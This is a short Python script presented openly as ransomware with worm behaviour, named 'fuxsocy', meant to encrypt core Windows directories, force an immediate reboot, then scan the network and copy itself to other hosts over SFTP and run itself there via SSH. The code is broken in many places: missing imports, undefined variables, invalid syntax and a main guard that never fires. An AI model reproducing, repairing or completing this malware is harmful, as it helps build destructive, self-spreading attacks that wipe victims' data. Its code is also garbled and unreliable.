#All imports here
import time
import os
import socket
import subprocess
import uuid
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from paramiko import SSHClient

#All variables to be declared here
f = Fernet(key)

dirs = ["$RECYCLE.BIN", "Documents and settings", "MSOCache", "Preflogs", "ProgramData", "Program Files", "Program Files (x86)", "Recovery", "temp", "Users", "Windows"]

keySalt = uuid.uuid4().hex
masterKey = Fernet.generate_key()

encryptedFiles = 0

#Pre-programmed functions to be declared here
def fuxocyMain():
    #fuxsocy, running this script will render all information unreadable

    for x in range(0,dirs.count()):
        encryptedFiles = encryptedFiles + 1
        encryptedDisk = f.encrypt(dirs[x])

    print(encryptedFiles + " core filesystems encrypted by root")
    print("All operations finished, bye bye")
    time.sleep(2)

    os.system('shutdown -r -t 0')

    establishNetwork()

def establishNetwork():
    thisPc = socket.gethostname()
    blacklist.append(thisPc)

    allHosts[] = scanip.scanip.start_scan()

    source = r'C:/fuxsocy.py'
    dest = r'C:/fuxsocy.py'
    hostname = allHosts[]
    port = 22 # default port for SSH

    try:
        t = paramiko.Transport((hostname, port))
        t.connect()
        sftp = paramiko.SFTPClient.from_transport(t)
        sftp.put(source, dest)

        ssh = paramiko.SSHClient()
        ssh.connect(hostname, port)
        ssh.exec_command("cd C:/; python3 fuxsocy.py")

    finally:
        t.close()

def encryptionMain():
    password = masterKey.encode() # Convert to type bytes
    salt = keySalt.encode()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=2048,
        salt=salt,
        iterations=100000,
        backend=default_backend()
        )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    fuxocyMain()

#Start main program after all variables are declared
if __name__ == '__name__':
    os.system('cls')
    encryptionMain()
